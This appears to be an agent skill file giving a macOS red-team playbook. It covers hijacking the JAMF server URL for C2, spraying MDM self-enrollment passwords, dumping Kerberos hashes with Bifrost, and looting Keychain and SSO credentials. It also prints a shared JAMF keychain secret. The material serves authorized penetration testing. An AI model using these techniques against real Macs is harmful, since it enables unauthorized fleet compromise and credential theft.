---
name: performing-macos-red-teaming
description: Conducting red team operations against macOS fleets during authorized engagements by abusing MDM platforms
  (JAMF, Kandji), MDM enrollment trust, Active Directory integration, the macOS Keychain, OneLogin/SSO-linked external
  services, and Safari auto-open behavior to move laterally and establish command-and-control across managed Macs.
domain: cybersecurity
subdomain: macos-security
tags:
- penetration-testing
- macos
- red-teaming
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
---

# Performing macOS Red Teaming

## When to Use

- During authorized red team engagements targeting an enterprise macOS fleet
- When the environment uses an MDM (JAMF Pro, Kandji) for device management and software distribution
- When Macs are bound to Active Directory or use SSO/OneLogin to reach external services (GitHub, AWS)
- When you have a foothold on one Mac and need to pivot, harvest credentials, or reach C2
- macOS red teaming differs from Windows: Macs are often integrated directly with external SaaS platforms

## Critical: Techniques Most Often Missed

### 1. JAMF JSS URL hijack → turn MDM into C2

`jamf` reads its JSS server URL from `/Library/Preferences/com.jamfsoftware.jamf.plist`. A malicious package that overwrites this file can repoint the agent at an attacker-controlled listener (e.g., a Mythic/Typhon C2), turning legitimate management traffic into C2.

```bash
plutil -convert xml1 -o - /Library/Preferences/com.jamfsoftware.jamf.plist | rg jss_url
# after overwriting the URL, force a check-in:
sudo jamf policy -id 0
```

**How to CONFIRM:** read `jss_url`; verify `jamf` persists as a LaunchDaemon at `/Library/LaunchAgents/com.jamf.management.agent.plist`; a forced `jamf policy` reaches your listener.

### 2. Impersonating device ↔ JAMF communication

To impersonate a managed device you need the hardware UUID and the JAMF keychain holding the device cert.

```bash
ioreg -d2 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $(NF-1)}'
ls -l /Library/Application\ Support/Jamf/JAMF.keychain
```

Build a VM with the stolen hardware UUID and SIP disabled, drop the JAMF keychain, hook the agent, and harvest its data. Note the historic `jamf` binary keychain secret was shared: `jk23ucnq91jfu9aj`.

**How to CONFIRM:** the keychain file exists and the UUID extracts cleanly; the cloned device authenticates to the JSS.

### 3. Custom-script credential leakage

JAMF stages admin "custom scripts" in `/Library/Application Support/Jamf/tmp/` — placed, executed, then removed — and may pass credentials as parameters.

```bash
# monitor staged scripts (root) and process args (no root needed)
ls -l /Library/Application\ Support/Jamf/tmp/
ps aux | grep -i jamf
```

**How to CONFIRM:** observe a script file appear/disappear or a `ps` line exposing `-username`/`-password` args. `JamfExplorer.py` automates this.

## Workflow

### Step 1: Identify the management platform

```bash
jamf checkJSSConnection        # JAMF reachability
profiles list                  # installed configuration profiles
profiles status -type enrollment
```

Look for JAMF, Kandji, or other MDM agents. Check self-enrollment at `https://<company>.jamfcloud.com/enroll/`.

### Step 2: Attack MDM enrollment and self-enrollment

A device adds the MDM's SSL cert as a trusted CA at enrollment, so after enrolling you can sign payloads the device will trust. To enroll you install a `mobileconfig` as root (deliverable via a `pkg`, which Safari auto-unzips).

```bash
# password-spray self-enrollment with JamfSniper.py, then brute usernames
python3 JamfSniper.py https://<company>.jamfcloud.com
```

If you compromise MDM admin credentials you can push malware to all managed machines, create local admins, set firmware passwords, or change FileVault keys.

### Step 3: Enumerate Active Directory integration

```bash
dscl "/Active Directory/[Domain]/All Domains" ls /
echo show com.apple.opendirectoryd.ActiveDirectory | scutil
dsconfigad -show
# users / computers / groups
dscl . ls /Users
dscl "/Active Directory/TEST/All Domains" read /Users/[username]
dscacheutil -q user
```

Local user/group data lives in `/var/db/dslocal/nodes/Default/` (e.g., `users/mark.plist`, `groups/admin.plist`). MacOS users are Local, Network, or Mobile.

### Step 4: Kerberos and lateral movement with Bifrost / MacHound

```bash
# dump hashes
bifrost --action askhash --username [name] --password [pw] --domain [domain]
# request and inject a TGT
bifrost --action asktgt --username [user] --domain [domain] --hash [hash] --enctype aes256
# request service ticket, then access shares
bifrost --action asktgs --spn [service] --domain [domain] --username [user] --hash [hash] --enctype [enctype]
smbutil view //computer.fqdn
mount -t smbfs //server/folder /local/mount/point
```

The `Computer$` account password is accessible in the System keychain. MacHound adds `CanSSH`, `CanVNC`, and `CanAE` (AppleEvent execution) edges to BloodHound; Orchard (JXA) enumerates AD.

### Step 5: Loot the Keychain and SSO-linked services

The login/System keychains likely hold credentials that advance the operation without prompting. macOS fleets commonly use OneLogin-synced credentials to reach GitHub, AWS, etc., so keychain and SSO token theft expands blast radius far beyond the host. Enumerate keychain items and target browser/SSO session material.

### Step 6: Abuse Safari auto-open for delivery

Safari auto-opens "safe" downloads: a downloaded zip is automatically decompressed, enabling staged payload delivery (e.g., a zipped pkg/mobileconfig).

## Key Concepts

| Concept | Description |
|---------|-------------|
| **MDM (JAMF/Kandji)** | Central management able to install apps, create admins, set firmware/FileVault — compromise = fleet compromise |
| **Enrollment CA trust** | Enrolled devices trust the MDM's SSL cert as a CA, letting you sign trusted payloads |
| **JSS URL** | JAMF server URL in `com.jamfsoftware.jamf.plist`; overwrite to repoint the agent to C2 |
| **Keychain** | Stores credentials and device/`Computer$` certs; high-value loot, ideally accessed without prompts |
| **AD integration** | Macs bound to AD; enumerate with `dscl`, attack Kerberos with Bifrost |
| **OneLogin/SSO** | macOS often reaches external SaaS via SSO; token theft expands reach |
| **Safari auto-open** | "Safe" downloads auto-decompress/open, aiding payload delivery |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **JamfSniper.py / JamfExplorer.py** | Self-enrollment password spray; monitor staged scripts and process args (WithSecure Jamf-Attack-Toolkit) |
| **MicroMDM** | Stand up your own MDM for Apple devices (needs vendor-signed CSR via mdmcert.download) |
| **Bifrost** | Objective-C Heimdal krb5 interaction for Kerberos hashes/TGT/TGS on macOS |
| **MacHound** | BloodHound extension adding CanSSH/CanVNC/CanAE edges for macOS AD |
| **Orchard** | JXA-based Active Directory enumeration |
| **dscl / dsconfigad / scutil** | Local and AD directory enumeration |
| **Mythic (Orthrus/Typhon)** | C2 agents; Orthrus uses the MDM-enrollment technique |

## Common Scenarios

### Scenario 1: JAMF as C2
A malicious pkg overwrites `com.jamfsoftware.jamf.plist` `jss_url` to a Mythic listener; `sudo jamf policy -id 0` makes the agent beacon to attacker infrastructure.

### Scenario 2: Self-enrollment credential spray
`/enroll/` is internet-exposed with self-enrollment enabled; JamfSniper.py sprays valid creds, granting access to push configurations.

### Scenario 3: AD Kerberos pivot
After harvesting a hash, Bifrost mints a TGT and service tickets, then `mount -t smbfs` reaches file shares on other domain hosts.

### Scenario 4: Keychain + SSO chaining
Keychain extraction yields a OneLogin session that unlocks the org's GitHub and AWS, extending compromise to cloud assets.

## Output Format

```
## macOS Red Team Finding

**Finding**: MDM compromise enabling fleet-wide code execution
**Severity**: Critical (CVSS 9.1)
**Platform**: JAMF Pro (cloud), 420 managed Macs
**Access**: Self-enrollment + harvested admin credentials

### Attack Path
1. Discovered self-enrollment at https://corp.jamfcloud.com/enroll/
2. Password-sprayed with JamfSniper.py -> valid operator account
3. Pushed test policy (custom script) to a pilot smart group
4. Confirmed root execution on enrolled endpoint

### Evidence
| Artifact | Detail |
|----------|--------|
| JSS URL | /Library/Preferences/com.jamfsoftware.jamf.plist |
| Agent persistence | /Library/LaunchAgents/com.jamf.management.agent.plist |
| Staged script | /Library/Application Support/Jamf/tmp/<script> |

### Recommendation
1. Disable public self-enrollment; require device attestation
2. Enforce MFA and least privilege on MDM operator accounts
3. Protect the JAMF keychain and rotate any shared secrets
4. Never pass credentials as script parameters; use secure variables
5. Monitor com.jamfsoftware.jamf.plist integrity and unexpected check-in URLs
```
